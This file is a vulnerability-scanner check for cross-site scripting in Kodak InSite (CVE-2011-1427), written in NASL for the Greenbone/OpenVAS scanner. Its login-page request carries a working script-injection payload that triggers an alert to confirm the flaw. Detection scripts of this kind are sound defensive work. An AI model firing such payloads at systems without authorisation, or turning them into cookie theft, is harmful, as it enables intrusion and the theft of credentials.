if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801909" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-03-22 08:43:18 +0100 (Tue, 22 Mar 2011)" );
	script_cve_id( "CVE-2011-1427" );
	script_bugtraq_id( 46762 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "Kodak InSite Multiple Cross Site Scripting Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2011/Mar/73" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/65941" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/516880" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/archive/1/516880/100/0/threaded" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to execute arbitrary
  script code in the browser of an unsuspecting user in the context of the
  affected site. This may allow the attacker to steal cookie-based authentication
  credentials and to launch other attacks." );
	script_tag( name: "affected", value: "Kodak InSite version 6.0.x and prior." );
	script_tag( name: "insight", value: "Multiple flaws are due to input validation error in 'Language'
  parameter to Pages/login.aspx, 'HeaderWarning' parameter to Troubleshooting
  /DiagnosticReport.asp and 'User-Agent' header to troubleshooting/speedtest.asp,
  which allows remote attackers to inject arbitrary web script or HTML." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Kodak InSite and is prone to multiple
  cross-site scripting vulnerabilities." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_asp( port: port )){
	exit( 0 );
}
sndReq = http_get( item: NASLString( "/Site/Pages/login.aspx" ), port: port );
rcvRes = http_keepalive_send_recv( port: port, data: sndReq );
if(ContainsString( rcvRes, "InSite" ) && ContainsString( rcvRes, "PoweredByKodak" )){
	url = "/Pages/login.aspx?SessionTimeout=False&Language=de%26rflp=True','" + "00000000-0000-0000-0000-000000000000');alert('XSS!-TEST'); return fal" + "se; a('";
	if(http_vuln_check( port: port, url: url, pattern: ");alert\\('XSS!-TEST'\\);", check_header: TRUE )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

